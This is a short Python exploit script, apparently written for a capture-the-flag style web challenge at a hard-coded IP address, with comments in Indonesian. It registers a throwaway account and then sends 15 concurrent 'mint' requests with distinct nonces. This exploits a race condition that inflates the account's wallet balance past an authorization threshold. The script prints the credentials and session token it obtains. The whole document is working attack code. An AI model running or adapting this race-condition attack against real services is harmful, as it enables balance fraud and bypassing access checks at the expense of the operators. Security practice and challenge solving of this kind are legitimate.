import requests, concurrent.futures, json, random, time

UA = "Mozilla/5.0 (X11; Linux x86_64; rv:150.0) Gecko/20100101 Firefox/150.0"
BASE = "http://15.232.64.175:13402"

# register
r = requests.post(f"{BASE}/api/auth/register",
    headers={"User-Agent": UA, "Content-Type": "application/x-www-form-urlencoded"},
    data={"username": f"x0r_{random.randint(10000,99999)}", "password": "pwd12345"})
TOKEN = r.cookies.get("q_token")
cookies = {"q_token": TOKEN}

# cek wallet sebelum race
me = requests.get(f"{BASE}/api/auth/me", headers={"User-Agent": UA}, cookies=cookies).json()
print(f"[*] username: {me['username']}")
print(f"[*] password: pwd12345")
print(f"[*] user_id: {me['user_id']}")
print(f"[*] wallet: {me['wallet']}")


# race mint 15x paralel (nonce beda -> semua sukses diproses bareng)
def fire(i):
    return requests.post(f"{BASE}/api/vault/mint",
        headers={"User-Agent": UA, "Content-Type": "application/json"},
        cookies=cookies,
        json={"amount": 100, "nonce": f"noncelong{i:04d}"},
        timeout=10).text


with concurrent.futures.ThreadPoolExecutor(max_workers=15) as ex:
    results = list(ex.map(fire, range(15)))

sukses = sum(1 for r in results if "processing" in r)
print(f"[*] race mint: {sukses}/15 sukses")

# tunggu settle
time.sleep(3)

# cek wallet setelah race
me = requests.get(f"{BASE}/api/auth/me", headers={"User-Agent": UA}, cookies=cookies).json()
print(f"[*] wallet setelah: {me['wallet']}")   # 100 -> 250 (>= 200, lolos WS auth gate)
print(f"[*] token: {TOKEN}")
